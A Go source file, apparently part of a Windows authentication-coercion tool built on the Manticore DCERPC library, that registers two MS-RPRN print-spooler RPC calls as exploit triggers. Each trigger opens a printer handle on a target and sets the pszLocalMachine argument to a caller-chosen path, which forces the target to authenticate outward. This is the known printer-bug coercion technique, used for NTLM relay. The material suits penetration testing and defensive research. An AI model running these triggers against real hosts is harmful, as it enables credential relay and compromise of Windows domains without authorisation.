package methods

import (
	"fmt"

	winspool "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0"
	functions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	msrprn "github.com/TheManticoreProject/Manticore/windows/protocols/ms-rprn"
)

const rprnServerRead ndr.DWORD = 0x00020002

// --- Op 62: RpcRemoteFindFirstPrinterChangeNotification ---

type rpcRemoteFindFirstPrinterChangeNotificationRequest struct {
	HPrinter        msrprn.PRINTER_HANDLE
	FdwFlags        ndr.DWORD
	FdwOptions      ndr.DWORD
	PszLocalMachine *ndr.WSTR `ndr:"unique"`
	DwPrinterLocal  ndr.DWORD
	CbBuffer        ndr.DWORD
	PBuffer         []uint8 `ndr:"unique,size_is=CbBuffer"`
}

func (*rpcRemoteFindFirstPrinterChangeNotificationRequest) Opnum() uint16 {
	return winspool.OpnumRpcRemoteFindFirstPrinterChangeNotification
}

type rpcRemoteFindFirstPrinterChangeNotificationResponse struct {
	PBuffer []uint8   `ndr:"unique,size_is=CbBuffer"`
	Status  ndr.DWORD `ndr:"retval"`
}

// --- Op 65: RpcRemoteFindFirstPrinterChangeNotificationEx ---

type rpcRemoteFindFirstPrinterChangeNotificationExRequest struct {
	HPrinter        msrprn.PRINTER_HANDLE
	FdwFlags        ndr.DWORD
	FdwOptions      ndr.DWORD
	PszLocalMachine *ndr.WSTR `ndr:"unique"`
	DwPrinterLocal  ndr.DWORD
	POptions        *msrprn.RPC_V2_NOTIFY_OPTIONS `ndr:"unique"`
}

func (*rpcRemoteFindFirstPrinterChangeNotificationExRequest) Opnum() uint16 {
	return winspool.OpnumRpcRemoteFindFirstPrinterChangeNotificationEx
}

type rpcRemoteFindFirstPrinterChangeNotificationExResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

func rprnAccess() []Access {
	syntaxes := []syntax.SyntaxID{winspool.SyntaxID()}
	return []Access{
		{Transport: TransportNamedPipe, Pipe: winspool.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportTCP, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
	}
}

func rprnOpenPrinter(rpc ndr.Invoker, target string) (msrprn.PRINTER_HANDLE, error) {
	printerName := ndr.WSTR(fmt.Sprintf(`\\%s`, target))
	handle, err := functions.RpcOpenPrinter(rpc, &printerName, nil, msrprn.DEVMODE_CONTAINER{}, rprnServerRead)
	if err != nil {
		return handle, fmt.Errorf("RpcOpenPrinter: %w", err)
	}
	return handle, nil
}

func registerRPRN(r *Registry) {
	access := rprnAccess()
	paths := rprnPaths()

	r.Register(Method{
		Protocol: "MS-RPRN", ProtocolLong: "Print System Remote",
		Function:       "RpcRemoteFindFirstPrinterChangeNotification",
		Opnum:          winspool.OpnumRpcRemoteFindFirstPrinterChangeNotification,
		VulnerableArgs: []string{"pszLocalMachine"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			handle, err := rprnOpenPrinter(rpc, target)
			if err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			localMachine := ndr.WSTR(exploitPath)
			req := &rpcRemoteFindFirstPrinterChangeNotificationRequest{
				HPrinter:        handle,
				FdwFlags:        0x00000100,
				PszLocalMachine: &localMachine,
			}
			var resp rpcRemoteFindFirstPrinterChangeNotificationResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-RPRN", ProtocolLong: "Print System Remote",
		Function:       "RpcRemoteFindFirstPrinterChangeNotificationEx",
		Opnum:          winspool.OpnumRpcRemoteFindFirstPrinterChangeNotificationEx,
		VulnerableArgs: []string{"pszLocalMachine"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			handle, err := rprnOpenPrinter(rpc, target)
			if err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			localMachine := ndr.WSTR(exploitPath)
			req := &rpcRemoteFindFirstPrinterChangeNotificationExRequest{
				HPrinter:        handle,
				FdwFlags:        0x00000100,
				PszLocalMachine: &localMachine,
			}
			var resp rpcRemoteFindFirstPrinterChangeNotificationExResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
